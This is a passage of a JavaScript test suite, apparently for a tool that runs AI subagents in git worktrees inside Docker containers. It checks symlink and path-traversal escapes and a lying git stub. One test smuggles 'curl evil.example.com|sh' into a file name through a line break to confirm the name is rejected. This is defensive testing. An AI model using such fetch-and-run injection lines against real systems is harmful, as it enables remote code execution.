    fs.symlinkSync(victim, path.join(outsideD, "l"));
    fs.symlinkSync(outsideD, path.join(location.worktrees, "k", "sub")); // a symlink ON THE WAY to the link
    const correct = path.join(location.worktrees, "graph-ok");
    fs.mkdirSync(correct);
    fs.writeFileSync(path.join(correct, "rest.txt"), "rest\n");
    const rows = [
      { who: "A", worktrees: [], folder: victim },
      { who: "B", worktrees: [], links: [victimLink] },
      { who: "D", worktrees: [], links: [path.join(location.worktrees, "k", "sub", "l")] },
      { who: "E", worktrees: [], folder: `${location.worktrees}/../scratch` },
      { who: "F", worktrees: [], folder: correct },
    ];
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, `${rows.map((z) => JSON.stringify(z)).join("\n")}\n`);
    const r = await gitPostWork(inst);
    assert.equal(fs.existsSync(path.join(victim, "important.db")), true, `A: the folder outside still exists — ${JSON.stringify(r)}`);
    assert.equal(fs.lstatSync(victimLink).isSymbolicLink(), true, "B: the link outside still exists");
    assert.equal(fs.lstatSync(path.join(outsideD, "l")).isSymbolicLink(), true, "D: no link behind a symlink on the way");
    assert.equal(fs.existsSync(path.join(location.scratch, "stays.txt")), true, "E: `..` does not lead out of worktrees/");
    assert.equal(fs.existsSync(correct), false, "F: the correct row ran");
    assert.deepEqual({ read: r.read, dismissed: r.dismissed, removed: r.removed }, { read: 5, dismissed: 4, removed: 1 });
    assert.equal(r.error.filter((f) => f.startsWith("row dismissed")).length, 4, r.error.join(" · "));

    // 3. The worktree root itself a symlink to the outside: a lexically correct child still leads out.
    const outsideC = path.join(o.location, "outside-c");
    fs.mkdirSync(path.join(outsideC, "x"), { recursive: true });
    fs.writeFileSync(path.join(outsideC, "x", "important.txt"), "x\n");
    fs.rmSync(location.worktrees, { recursive: true, force: true });
    fs.symlinkSync(outsideC, location.worktrees);
    fs.writeFileSync(file, `${JSON.stringify({ who: "C", worktrees: [], folder: path.join(location.worktrees, "x") })}\n`);
    const c = await gitPostWork(inst);
    assert.equal(fs.existsSync(path.join(outsideC, "x", "important.txt")), true, `C: nothing behind the bent root — ${JSON.stringify(c)}`);
    assert.equal(c.dismissed, 1);
    fs.rmSync(location.worktrees);

    // 4. A job outside the root is not even entered (it would not run at the start anyway).
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    const outside = path.join(o.location, "wt-outside", "agent-x");
    realGit(K, ["worktree", "add", "-q", "-b", "cbase/agent-x", outside, "HEAD"], o.env);
    dockerDo(fd, "stop", name);
    const e = await worktreeTeardown(inst, { who: "Test", worktrees: [{ repo: K, dir: outside }] });
    assert.equal(e.postWork, false, JSON.stringify(e));
    assert.ok(e.error.some((f) => f.includes("outside the instance's worktree root")), e.error.join(" · "));
    assert.equal(fs.existsSync(file), false, "nothing entered");
    assert.ok(fs.existsSync(outside), "the worktree stays");
    dockerDo(fd, "start", name);
  });
});

// ── (9) project switch in the middle of a turn ────────────────────────────────────────────────────────────────────────
// The main agent stands before the gate "switch-<round>" (the test switches the project of the chat there), then a subagent with
// isolation:"worktree" in the foreground; its result lies in result-switch-<round>.txt. The round is in the message.
const MAIN_SWITCH = `
  const everything = ((msg.message && msg.message.content) || []).map((c) => (c && c.text) || "").join("\\n");
  const round = (everything.match(/ROUND:(\\w+)/) || [])[1] || "x";
  await gate("switch-" + round);
  const input = { run_in_background: false, description: "Part", prompt: "CHANGE please", isolation: "worktree" };
  say({ type: "assistant", message: { id: "m_wt" + round, content: [{ type: "tool_use", id: "toolu_wt" + round, name: "mcp__cbase__cbase_agent", input }] } });
  const r = await mcpCall("cbase_agent", input);
  const t = (r.result && r.result.isError ? "ERROR " : "") + textOf(r);
  say({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "toolu_wt" + round, content: t }] } });
  fs.writeFileSync(path.join(LOCATION, "result-switch-" + round + ".txt"), t);
  finished();
  say({ type: "result", result: "finished", session_id: "main-session" });`;
const SUB_CHANGE = `
  if (text.includes("CHANGE")) fs.writeFileSync(path.join(process.cwd(), "new.txt"), "from the subagent\\n");
  finished();
  say({ type: "result", result: "cwd=" + process.cwd(), session_id: "sub-session" });`;

test("(9) project switch A → B in the middle of a turn: the worktree comes from the repo of the CORE (A), not from the one of the converted B; without any instance as today", async () => {
  const o = gitLocation("cbase-gitwt-switch-");
  let fd = null;
  try {
    await withEnvironment({ ...o.env }, () => withAgentsServer(async (ctx) => {
      const { base, ws, root } = ctx;
      // One round: new chat on `from`, at the gate the switch to `to`, then the worktree start → its report.
      const round = async (name, from, after) => {
        const chat = await json(`${base}/api/chats`, { method: "POST", body: JSON.stringify({
          workspaceId: ws.id, projectId: from, provider: "claude", model: "claude-haiku-4-5-20251001", permissionMode: "bypassPermissions",
        }) });
        await json(`${base}/api/chats/${chat.id}/message`, { method: "POST", body: JSON.stringify({ text: `ROUND:${name}` }) });
        await ctx.gate.reached(`switch-${name}`);
        // The switch is allowed, the running turn (and its core) stay in the old project.
        const p = await json(`${base}/api/chats/${chat.id}`, { method: "PATCH", body: JSON.stringify({ projectId: after }) });
        assert.equal(p.projectId, after, JSON.stringify(p));
        ctx.gate.open(`switch-${name}`);
        const res = path.join(root, `result-switch-${name}.txt`);
        await waitForTruthy(() => fs.existsSync(res), `result of the worktree start (${name})`);
        await ctx.waitForIdle();
        const t = fs.readFileSync(res, "utf8");
        assert.doesNotMatch(t, /^ERROR /, t);
        const b = JSON.parse(t);
        assert.ok(b.worktree, `the changed worktree is in the report: ${t}`);
        return fs.realpathSync(realGit(b.worktree, ["rev-parse", "--git-common-dir"], o.env).trim());
      };
      const worktreesOf = (repo) => realGit(repo, ["worktree", "list", "--porcelain"], o.env).split("\n").filter((l) => l.startsWith("worktree "));
      // A: not converted, a repo app/ in the project folder; the chat works in the workspace (no repo). Create empty first.
      const pathA = path.join(root, "workspace", "till");
      const A = await json(`${base}/api/workspaces/${ws.id}/projects`, { method: "POST", body: JSON.stringify({ name: "Till", path: pathA }) });
      const appA = path.join(pathA, "app");
      createRepo(appA, o.env);
      // B: converted (instance row, operation mark, running project container), a repo repo/.
      const s = scenario(ctx);
      const repoB = path.join(s.path, "repo");
      createRepo(repoB, o.env);
      fd = await fakeDocker({ programs: s.programs });
      await withEnvironment({ CBASE_PROJECT_STAGE_MS: "3600000", CBASE_NETWORK_ROOT: s.root }, () => withOps(fd, async () => {
        const name = `cbase-p-${s.projectId}`;
        const cid = dockerDo(fd, "run", "-d", "--name", name, "--label", `cbase.project=${s.projectId}`, "cbase-projectbox:latest");
        store.createProjectInstance({ projectId: s.projectId, state: "ready", convertedAt: Date.now(), containerId: cid, desired: desiredFromInspect([]) });
        assert.equal(await round("b1", A.id, s.projectId), fs.realpathSync(path.join(appA, ".git")), "from the repo of the project in which the turn runs (A)");
        const wtB = worktreesOf(repoB);
        assert.equal(wtB.length, 1, `the repo of B carries no worktree: ${wtB.join(", ")}`);
        assert.deepEqual(branches(repoB, o.env), ["main"], "and no branch");
      }));
      // G2: without the operation mark there is no instance — today's way stays: the CURRENT focus project (B).
      assert.equal(await round("g2", A.id, s.projectId), fs.realpathSync(path.join(repoB, ".git")), "without any instance: as today the current project");
    }, { claude: fakeClaude({ main: MAIN_SWITCH, sub: SUB_CHANGE }) }));
  } finally {
    fd?.cleanUp();
    fs.rmSync(o.location, { recursive: true, force: true });
  }
});

// ── (10) the cap of the hook "serverEnd" ──────────────────────────────────────────────────────────────────
// No clock as verdict: the job releases in the next tick AFTER the call (setImmediate). With cap 0 the call returns before;
// a large cap waits for the job instead of waiting out the clock (an hour).
test("(10) openGitJobsUntil: cap 0 does not wait at all and reports it; a finished job does not wait out the clock", async () => {
  assert.deepEqual(await openGitJobsUntil(0), { finished: true, open: 0 }, "nothing open");
  const job = () => {
    let go = null;
    const p = withOpen(new Promise((resolve) => { go = resolve; }));
    return { p, go: () => go() };
  };
  const a = job();
  const until0 = openGitJobsUntil(0);
  setImmediate(a.go);
  assert.deepEqual(await until0, { finished: false, open: 1 }, "0 = do not wait at all: the job was still hanging");
  await a.p;
  await openGitJobs();
  const b = job();
  const untilLarge = openGitJobsUntil(3_600_000);
  setImmediate(b.go);
  assert.deepEqual(await untilLarge, { finished: true, open: 0 }, "the job ended before the cap");
});

// ── (11) the idle check counts open git jobs ───────────────────────────────────────────────────────────
test("(11) projectIdle: a running teardown job in the project container is open work — no recreate underneath; it holds the main, no copy", async () => {
  await unit(async ({ fd, o, inst }) => {
    fs.mkdirSync(DIRS.data, { recursive: true });
    store.initStore(DIRS.data);
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    const dir = path.join(locationFor({ projectId: "p1", converted: true }).worktrees, "agent-lr");
    realGit(K, ["worktree", "add", "-q", "-b", "cbase/agent-lr", dir, "HEAD"], o.env);
    assert.deepEqual(projectIdle("p1").open, [], "quiet before");
    const p = worktreeTeardown(inst, { who: "Test", worktrees: [{ repo: K, dir, branch: "cbase/agent-lr", deleteBranch: true }] });
    await fd.gateReached("git"); // the `status` in the container stands at the gate
    const l = projectIdle("p1");
    assert.equal(l.quiet, false);
    assert.deepEqual(l.open.map((x) => x.reason), ["git"], JSON.stringify(l.open));
    assert.equal(openGitJobsOf("p1"), 1);
    // A job in the main holds the main, never a copy (the job of a copy holds that copy).
    assert.deepEqual(instanceIdle("p1/main").open.map((x) => x.reason), ["git"], "the main counts the job");
    assert.deepEqual(instanceIdle("p1/copy-k1").open.map((x) => x.reason), [], "a copy does not count the job of the main");
    fd.openGate("git");
    const r = await p;
    assert.equal(r.removed, true, JSON.stringify(r));
    await openGitJobs();
    assert.equal(openGitJobsOf("p1"), 0);
    assert.equal(projectIdle("p1").quiet, true, "quiet afterwards");
  }, { docker: { execGate: "git" } });
});

// ── (12) restart and pause mean "down" ──────────────────────────────────────────────────────────────────
test("(12) containerStands: \"is restarting\" and \"is paused\" — the job goes to the post-work, the worktree does not count as changed", async () => {
  // The wordings of the daemon (moby daemon/exec.go) and the two that already applied.
  const RESTART = "Error response from daemon: Container 4f2a is restarting, wait until the container is running";
  const PAUSE = "Error response from daemon: Container 4f2a is paused, unpause the container before exec";
  for (const s of ["Error response from daemon: container 4f2a is not running", "Error response from daemon: No such container: cbase-p-x", RESTART]) {
    assert.equal(containerStands({ code: 1, stderr: s }), true, s);
    assert.equal(containerPaused({ code: 1, stderr: s }), false, s);
  }
  // "is paused" means wait (the pause barrier), not "down" — otherwise the git view would wake a paused main.
  assert.equal(containerStands({ code: 1, stderr: PAUSE }), false, "\"is paused\" is not \"down\"");
  assert.equal(containerPaused({ code: 1, stderr: PAUSE }), true);
  assert.equal(containerStands({ code: 1, stderr: "fatal: not a git repository" }), false);
  assert.equal(containerPaused({ code: 0, stderr: PAUSE }), false, "exit 0 is no pause");
  // On the way: a docker that refuses every exec with the wording of the restart or the pause — both into the post-work.
  for (const WORDING of [RESTART, PAUSE]) await unit(async ({ o, inst }) => {
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    const dir = path.join(locationFor({ projectId: "p1", converted: true }).worktrees, "agent-ns");
    realGit(K, ["worktree", "add", "-q", "-b", "cbase/agent-ns", dir, "HEAD"], o.env);
    const denier = path.join(o.location, "docker-restart");
    fs.writeFileSync(denier, `#!/bin/sh\nprintf '%s\\n' '${WORDING}' >&2\nexit 1\n`, { mode: 0o755 });
    const r = await withEnvironment({ CBASE_DOCKER_BIN: denier }, () => worktreeTeardown(inst, { who: "Test", worktrees: [{ repo: K, dir, branch: "cbase/agent-ns", deleteBranch: true }] }));
    assert.deepEqual({ postWork: r.postWork, changed: r.changed }, { postWork: true, changed: false }, JSON.stringify(r));
    assert.ok(fs.existsSync(dir), "the worktree stays until the next start");
    assert.deepEqual(fs.readFileSync(postWorkFile("p1"), "utf8").split("\n").filter(Boolean).map((z) => JSON.parse(z).worktrees[0].dir), [dir]);
  });
});

// ── (13) git.path and a symlink ───────────────────────────────────────────────────────────────────────────
test("(13) VS Code: git.path in a symlink writes to its target, a dangling link stays, a foreign git.path is reported", async () => {
  const o = gitLocation("cbase-vscode-link-");
  try {
    const wrapper = path.join(o.location, "cbase-git");
    fs.writeFileSync(wrapper, "#!/bin/sh\n", { mode: 0o755 });
    const dotfiles = path.join(o.location, "dotfiles", "vscode-machine.json");
    fs.mkdirSync(path.dirname(dotfiles), { recursive: true });
    fs.writeFileSync(dotfiles, JSON.stringify({ "editor.fontSize": 13, "git.path": ["/opt/git/bin/git", "/usr/bin/git"] }));
    const file = path.join(o.location, "vs", "data", "Machine", "settings.json");
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.symlinkSync(dotfiles, file);
    await withEnvironment({ CBASE_GIT_WRAPPER: wrapper, CBASE_VSCODE_MACHINE: file }, async () => {
      const r = enterGitPath();
      assert.equal(r.written, true, JSON.stringify(r));
      assert.deepEqual(r.overwritten, ["/opt/git/bin/git", "/usr/bin/git"], "the old value is reported");
      assert.equal(fs.lstatSync(file).isSymbolicLink(), true, "the link stays a link");
      assert.deepEqual(JSON.parse(fs.readFileSync(dotfiles, "utf8")), { "editor.fontSize": 13, "git.path": wrapper }, "written to its target");
      assert.deepEqual(fs.readdirSync(path.dirname(dotfiles)), ["vscode-machine.json"], "no tmp remainder");
      assert.equal(enterGitPath().unchanged, true);
      assert.equal("overwritten" in enterGitPath(), false, "without a foreign value no report");
      // A dangling link: not replaced, reported.
      fs.rmSync(dotfiles);
      const empty = enterGitPath();
      assert.ok(empty.error && /dangling symlink/.test(empty.error), JSON.stringify(empty));
      assert.equal(fs.lstatSync(file).isSymbolicLink(), true, "the dangling link stays");
      assert.equal(fs.existsSync(dotfiles), false);
    });
  } finally {
    fs.rmSync(o.location, { recursive: true, force: true });
  }
});

// ── (14) the file work of the graph worktree in the project container ─────────────────────────
// The fake docker shares the file system with B: what the "container" itself writes lands here on the same disk (in real
// operation it does not see B). So what is measured is what THIS process — B — touches (a spy on `fs`, which the modules read
// at call time through `import fs from "node:fs"`), and that the file work stands in the log as `docker exec … node -e …` or
// `sh -c …`/`rm -rf --`; for the row from a name with a line break also the content of the victim file.
const WRITING = new Set(["appendFileSync", "writeFileSync", "copyFileSync", "cpSync", "symlinkSync", "linkSync", "mkdirSync", "rmSync", "unlinkSync", "renameSync"]);
function fsSpy() {
  const names = [...WRITING, "readFileSync", "openSync"];
  const old = Object.fromEntries(names.map((n) => [n, fs[n]]));
  const log = [];
  for (const n of names) {
    fs[n] = function spy(...a) {
      log.push({ n, paths: a.filter((x) => typeof x === "string" || x instanceof URL).map(String), ...(n === "openSync" ? { flags: a[1] } : {}) });
      return old[n].apply(this, a);
    };
  }
  // The reading of `<repo>/.git/config` by git.js isProjectRepo (one bit: whether it is the project repo; a finding of its own, not
  // of this guard) — with an instance through the descriptor: `.git` (O_DIRECTORY) and `config` opened READ-ONLY
  // (runtime/real-path.js), the content then from the fd.
  const O = fs.constants;
  const onlyReading = (e) => typeof e.flags === "number" && (e.flags & (O.O_WRONLY | O.O_RDWR | O.O_CREAT | O.O_TRUNC | O.O_APPEND)) === 0;
  const configRead = (e) => (e.n === "readFileSync" && e.paths[0].endsWith(`${path.sep}.git${path.sep}config`))
    || (e.n === "openSync" && onlyReading(e) && /[\\/]\.git([\\/]config)?$/.test(e.paths[0] || ""));
  return {
    // What B touched under `root` — without the reading of `<repo>/.git/config` (see above).
    under: (root) => log.filter((e) => e.paths.some((p) => p === root || p.startsWith(`${root}${path.sep}`)))
      .filter((e) => !configRead(e)),
    // Only the reading of `<repo>/.git/config` under `root` (16): with an instance B must not touch it at all.
    config: (root) => log.filter((e) => configRead(e) && e.paths.some((p) => p === root || p.startsWith(`${root}${path.sep}`))),
    back() { for (const n of names) fs[n] = old[n]; },
  };
}
async function withSpy(fn) {
  const s = fsSpy();
  try { return { value: await fn(), s }; } finally { s.back(); }
}
const hostExecs = (fd) => fd.calls({ daemon: "host" }).filter((a) => a.args[0] === "exec");
const commandOf = (a) => a.args.slice(a.args.indexOf("--") + 1);

// A git in the "container" that lies as soon as a file under `lie/` demands it (never in B): `exclude` ⇒ the answer to
// `--git-path info/exclude`, `toplevel` ⇒ that to `--show-toplevel`, `lsfiles` ⇒ extra entries behind the real list.
function deceitfulGit(o) {
  const lie = path.join(o.location, "lie");
  fs.mkdirSync(lie);
  const log = path.join(o.bin, "git-log");
  fs.renameSync(path.join(o.bin, "git"), log);
  fs.writeFileSync(path.join(o.bin, "git"), `#!/bin/sh
if [ "$IN_CONTAINER" = container ]; then
  case "$*" in
    "rev-parse --path-format=absolute --git-path info/exclude") [ -f '${lie}/exclude' ] && { cat '${lie}/exclude'; exit 0; } ;;
    "rev-parse --show-toplevel") [ -f '${lie}/toplevel' ] && { cat '${lie}/toplevel'; exit 0; } ;;
    "ls-files -z --others --ignored --exclude-standard --directory") [ -f '${lie}/lsfiles' ] && { '${log}' "$@" || exit $?; cat '${lie}/lsfiles'; exit 0; } ;;
  esac
fi
exec '${log}' "$@"
`, { mode: 0o755 });
  return (what, content) => { const d = path.join(lie, what); if (content === null) fs.rmSync(d, { force: true }); else fs.writeFileSync(d, content); };
}
// A repo with the ignored entries (`.env`, `node_modules/`).
function repoWithOwn(dir, env, secret) {
  createRepo(dir, env, { file: ".gitignore", content: "node_modules/\n.venv/\n.env*\n" });
  fs.writeFileSync(path.join(dir, ".env"), `SECRET=${secret}\n`);
  fs.mkdirSync(path.join(dir, "node_modules", "pack"), { recursive: true });
  fs.writeFileSync(path.join(dir, "node_modules", "pack", "index.js"), "module.exports = 1;\n");
}

// The unit of (14): the repo with `.env` and `node_modules`, the project, the worktree root as in the product; plus the lying
// git (active only when a file demands it) and the victim file in "B".
async function graphUnit(fn) {
  return unit(async ({ fd, o }) => {
    const K = path.join(o.location, "proj", "till");
    repoWithOwn(K, o.env, "till");
    const project = { id: "p1", name: "Till", path: K };
    const root = locationFor({ projectId: "p1", converted: true }).worktrees;
    const programStarts = () => hostExecs(fd).filter((a) => commandOf(a)[0] === process.execPath && commandOf(a)[1] === "-e");
    const lie = deceitfulGit(o);
    const victimHome = path.join(o.location, "b-home");
    const victim = path.join(victimHome, ".bashrc");
    fs.mkdirSync(victimHome);
    fs.writeFileSync(victim, "# B\n");
    return fn({ fd, o, K, project, root, programStarts, lie, victimHome, victim });
  });
}

test("(14a) copies, links and info/exclude of the graph worktree arise with an instance in the project container, the removal (releasing links, run folder) likewise — B writes nothing in the repo and nothing in the worktree", async () => {
  await graphUnit(async ({ fd, o, K, project, root, programStarts }) => {
    const { value: info, s: sa } = await withSpy(() => createGraphWorktree({ startId: "e1e1e1a1aaaa0001", project, root }));
    assert.deepEqual(sa.under(K), [], "B touches nothing in the repo (copy, exclude)");
    assert.deepEqual(sa.under(info.dir), [], "B creates nothing in the worktree (copy, link)");
    assert.equal(programStarts().length, 1, "the file work is ONE docker exec … node -e");
    assert.equal(fs.readFileSync(path.join(info.dir, ".env"), "utf8"), "SECRET=till\n", ".env copied (in the container)");
    assert.equal(fs.readlinkSync(path.join(info.dir, "node_modules")), path.join(K, "node_modules"), "node_modules linked (in the container)");
    assert.deepEqual(info.own.map((e) => [path.relative(info.dir, e.path), e.kind]).sort(), [[".env", "copy"], ["node_modules", "link"]]);
    assert.ok(fs.readFileSync(path.join(K, ".git", "info", "exclude"), "utf8").split("\n").includes("/node_modules"), "info/exclude anchors the link");
    assert.ok(!realGit(info.dir, ["add", "-A", "--dry-run"], o.env).includes("node_modules"), "git add -A does not pick up the link");
    assert.equal(await graphWorktreeChanged(info), false);
    const { value: way, s: sw } = await withSpy(() => removeGraphWorktree(info));
    assert.deepEqual(way, { removed: true, changed: false, error: [] });
    assert.deepEqual(sw.under(info.dir), [], "B releases no link and deletes no folder — the container does");
    assert.ok(hostExecs(fd).some((a) => commandOf(a)[0] === "rm" && commandOf(a).at(-1) === info.dir), "rm -rf -- <run folder> in the container");
    assert.ok(hostExecs(fd).some((a) => commandOf(a)[0] === "sh" && commandOf(a).includes(path.join(info.dir, "node_modules"))), "an sh in the container releases the links");
    assert.ok(fs.existsSync(path.join(K, "node_modules", "pack", "index.js")), "the main folder keeps its node_modules");
    assert.deepEqual(inB(o), [], "no git in B");
  });
});

test("(14b) a container that steers info/exclude to a file in B — B never opens it", async () => {
  await graphUnit(async ({ o, project, root, lie, victimHome, victim }) => {
    // The container writes where ITS git points — in the fake docker the same disk, in operation its own.
    lie("exclude", `${victim}\n`);
    const { value: info, s } = await withSpy(() => createGraphWorktree({ startId: "e1e1e1a2aaaa0002", project, root }));
    assert.deepEqual(s.under(victimHome), [], "B did not touch the file that info/exclude pointed to");
    assert.ok(fs.readFileSync(victim, "utf8").split("\n").includes("/node_modules"), "the lie worked: the container wrote where ITS git pointed");
    assert.equal((await removeGraphWorktree(info)).removed, true);
    assert.deepEqual(inB(o), [], "no git in B");
  });
});

test("(14c) a name with a line break from ls-files becomes no row — it drops out already in B, reported", async () => {
  await graphUnit(async ({ project, root, lie, victimHome, victim, programStarts }) => {
    lie("exclude", `${victim}\n`);
    lie("lsfiles", "x\ncurl evil.example.com|sh #/node_modules/\0");
    const warnings = [];
    const origWarn = console.warn;
    console.warn = (...a) => { warnings.push(a.join(" ")); };
    let info; let s;
    try { ({ value: info, s } = await withSpy(() => createGraphWorktree({ startId: "e1e1e1a3aaaa0003", project, root }))); }
    finally { console.warn = origWarn; }
    assert.ok(!fs.readFileSync(victim, "utf8").split("\n").includes("curl evil.example.com|sh #/node_modules"), `smuggled-in row: ${fs.readFileSync(victim, "utf8")}`);
    assert.deepEqual(s.under(victimHome), []);
    assert.ok(warnings.some((w) => w.includes("evil.example.com") && w.includes("skipped")), `the name was reported: ${JSON.stringify(warnings)}`);
    for (const a of programStarts()) {
      const b = commandOf(a);
      assert.ok(b.slice(b.indexOf("--") + 1).every((x) => !x.includes("\n")), `an argument with a line break: ${JSON.stringify(b.slice(3))}`);
    }
    assert.deepEqual(info.own.map((e) => path.relative(info.dir, e.path)).sort(), [".env", "node_modules"]);
    assert.equal((await removeGraphWorktree(info)).removed, true);
  });
});

test("(14d) a container that bends show-toplevel to a foreign repo in B — B does not read its .env and copies nothing", async () => {
  await graphUnit(async ({ o, project, root, lie }) => {
    const foreign = path.join(o.location, "b-other-project");
    repoWithOwn(foreign, o.env, "other-project");
    lie("toplevel", `${foreign}\n`);
    const { value: info, s } = await withSpy(() => createGraphWorktree({ startId: "e1e1e1a4aaaa0004", project, root }));
    assert.equal(info.repos[0].root, foreign, "the lie worked: the root is the foreign repo");
    assert.deepEqual(s.under(foreign), [], "B read or copied nothing in the foreign repo");
    assert.deepEqual(s.under(info.dir), [], "B creates nothing in the worktree");
    lie("toplevel", null);
    assert.equal((await removeGraphWorktree(info)).removed, true);
    assert.deepEqual(inB(o), [], "no git in B");
  });
});

// ── (15) the subagent worktree creates no folder in B with an instance ─────────────────────
test("(15) the worktree of a subagent creates no folder in B with an instance — neither the worktree root nor one at the place from the show-toplevel of the container", async () => {
  await unit(async ({ o, inst }) => {
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    const gitFor = (k) => (k === "p1/main" ? gitInProject(inst) : null);
    // (a) With a worktree root (as in the product, runs/agents.js): `worktree add` creates its folders in the container, not B.
    const runtime = path.join(o.location, "runtime-new");
    let snapshot = null;
    const including = core({ cwd: K, instance: "p1/main", gitFor, worktreeRoot: path.join(runtime, "worktrees"), tun: (spec) => { snapshot = fs.existsSync(spec.cwd); } });
    const { s: sa } = await withSpy(() => including.rt.start(START));
    assert.equal(snapshot, true, "the worktree stood when the subagent ran");
    assert.deepEqual(sa.under(runtime), [], "B created no folder of the worktree root");
    // (b) Without a worktree root the place comes from the show-toplevel of the container (`<dirname>/.cbase-worktrees`) — B creates
    //     nothing there (the container cannot: its "repo" is none).
    const lie = deceitfulGit(o);
    const home = path.join(o.location, "b-home");
    fs.mkdirSync(path.join(home, "x"), { recursive: true });
    lie("toplevel", `${path.join(home, "x")}\n`);
    const without = core({ cwd: K, instance: "p1/main", gitFor });
    const { s: sb } = await withSpy(() => without.rt.start(START).then(() => null, (e) => e));
    assert.deepEqual(sb.under(home), [], "B created nothing at the place from the container output");
    assert.equal(fs.existsSync(path.join(home, ".cbase-worktrees")), false);
    lie("toplevel", null);
    assert.deepEqual(inB(o), [], "no git in B");
    await including.rt.close?.();
    await without.rt.close?.();
  });
});

// ── (16) the mark of the project repo is asked by the core in the container with an instance ─────────────────────────
test("(16) selectRepo with an instance does not read .git/config in B — the mark comes from git in the container, the worktree from the code repo; without an instance as today", async () => {
  await unit(async ({ o, inst }) => {
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    realGit(K, ["config", "--local", "cbase.projectRepo", "true"], o.env); // the project folder carries the project repo
    const app = path.join(K, "app");
    createRepo(app, o.env);
    const repoCandidates = () => [{ name: "till", relPath: "", root: K }, { name: "app", relPath: "app", root: app }];
    const gitFor = (k) => (k === "p1/main" ? gitInProject(inst) : null);
    const markerQuestion = ["config", "--local", "--type=bool", "--get", "cbase.projectRepo"];
    const worktreeFrom = () => callsValue(o).filter((a) => a.argv[0] === "worktree" && a.argv[1] === "add").map((a) => `${a.where} ${a.cwd}`);

    const including = core({ cwd: K, instance: "p1/main", gitFor, worktreeRoot: path.join(o.location, "wt"), repoCandidates });
    fs.writeFileSync(o.log, "");
    const { s } = await withSpy(() => including.rt.start(START));
    assert.deepEqual(s.config(K), [], "B read .git/config (working folder or candidate) — with an instance only the container asks");
    const questions = callsValue(o).filter((a) => markerQuestion.every((x, i) => a.argv[i] === x));
    assert.deepEqual(questions.map((a) => `${a.where} ${a.cwd}`), [`container ${K}`, `container ${app}`], "the mark did not come from git in the container");
    assert.deepEqual(worktreeFrom(), [`container ${app}`], "the worktree did not come from the code repo");
    assert.deepEqual(inB(o), [], "no git in B");

    // Without an instance today's call: B reads the mark itself (readFileSync), the same choice, all in B.
    const without = core({ cwd: K, gitFor, worktreeRoot: path.join(o.location, "wt-b"), repoCandidates });
    fs.writeFileSync(o.log, "");
    const { s: sb } = await withSpy(() => without.rt.start(START));
    assert.ok(sb.config(K).some((e) => e.n === "readFileSync" && e.paths[0] === path.join(K, ".git", "config")), "without an instance the call changed (G2)");
    assert.deepEqual(worktreeFrom(), [`B ${app}`]);
    assert.ok(callsValue(o).every((a) => a.where === "B" && !markerQuestion.every((x, i) => a.argv[i] === x)), "without an instance git asked the mark");
    await including.rt.close?.();
    await without.rt.close?.();
  });
});

// ── (17) LFS in the worktree of a subagent ───────────────────────────────────────────────────────────────────────
test("(17) the worktree of a subagent fetches its LFS files in the container with an instance; without an LFS file no lfs pull; without an instance no git-lfs", async () => {
  await unit(async ({ o, inst }) => {
    const lfsLog = path.join(o.location, "lfs.jsonl");
    fakeLfs(o.bin, lfsLog); // next to the logging git: on the PATH in the container as in B
    const OID = "d".repeat(64);
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    fs.writeFileSync(path.join(K, ".gitattributes"), "*.bin filter=lfs diff=lfs merge=lfs -text\n");
    fs.writeFileSync(path.join(K, "large.bin"), pointer(OID));
    realGit(K, ["add", "-A"], o.env);
    realGit(K, ["commit", "-q", "-m", "lfs"], o.env);
    let seen = null;
    const tun = (spec) => { seen = fs.readFileSync(path.join(spec.cwd, "large.bin"), "utf8"); };
    const including = core({ cwd: K, instance: "p1/main", gitFor: () => gitInProject(inst), worktreeRoot: path.join(o.location, "wt"), tun });
    await including.rt.start(START);
    assert.equal(seen, `LFS-CONTENT ${OID}\n`, "the subagent saw an LFS pointer instead of the file");
    const pulls = lfsCalls(lfsLog).filter((a) => a.command === "pull");
    assert.equal(pulls.length, 1, JSON.stringify(lfsCalls(lfsLog)));
    assert.equal(pulls[0].cwd, fs.realpathSync(including.calls[0].cwd), "LFS did not run in the worktree");
    assert.equal(pulls[0].where, "container", "LFS did not run in the container");
    assert.equal(pulls[0].skip, "0");
    assert.deepEqual(inB(o), [], "no git in B");

    // A repo without an LFS file: ls-files in the container, but no pull.
    const L = path.join(o.location, "proj", "light");
    createRepo(L, o.env);
    const light = core({ cwd: L, instance: "p1/main", gitFor: () => gitInProject(inst), worktreeRoot: path.join(o.location, "wt-l") });
    const prior = lfsCalls(lfsLog).length;
    await light.rt.start(START);
    const fresh = lfsCalls(lfsLog).slice(prior);
    assert.deepEqual(fresh.map((a) => `${a.where} ${a.command}`), ["container ls-files"], JSON.stringify(fresh));

    // Without an instance: no git-lfs (the worktree arises in B as today; the pointers stay as they stayed before).
    const without = core({ cwd: K, worktreeRoot: path.join(o.location, "wt-b"), gitFor: () => gitInProject(inst) });
    const priorB = lfsCalls(lfsLog).length;
    await without.rt.start(START);
    assert.equal(lfsCalls(lfsLog).length, priorB, "without an instance git-lfs ran (G2)");
    await including.rt.close?.();
    await light.rt.close?.();
    await without.rt.close?.();
  });
});

// ── (17b) LFS fails, git-lfs is missing ─────────────────────────────────────────
// A repo with an LFS file (pointer in the index) under `<proj>/<name>`, with `remote` also with a bare remote next to it.
function lfsRepo(o, name, oid, { remote = false } = {}) {
  const dir = path.join(o.location, "proj", name);
  createRepo(dir, o.env, remote ? { remote: path.join(o.location, `${name}-remote.git`) } : {});
  fs.writeFileSync(path.join(dir, ".gitattributes"), "*.bin filter=lfs diff=lfs merge=lfs -text\n");
  fs.writeFileSync(path.join(dir, "large.bin"), pointer(oid));
  realGit(dir, ["add", "-A"], o.env);
  realGit(dir, ["commit", "-q", "-m", "lfs"], o.env);
  if (remote) realGit(dir, ["push", "-q"], o.env);
  return dir;
}
// Record console.warn (passed on), restored in the finally.
async function withWarnings(fn) {
  const rows = [];
  const orig = console.warn;
  console.warn = (...a) => { rows.push(a.map(String).join(" ")); return orig.apply(console, a); };
  try { return await fn(rows); } finally { console.warn = orig; }
}

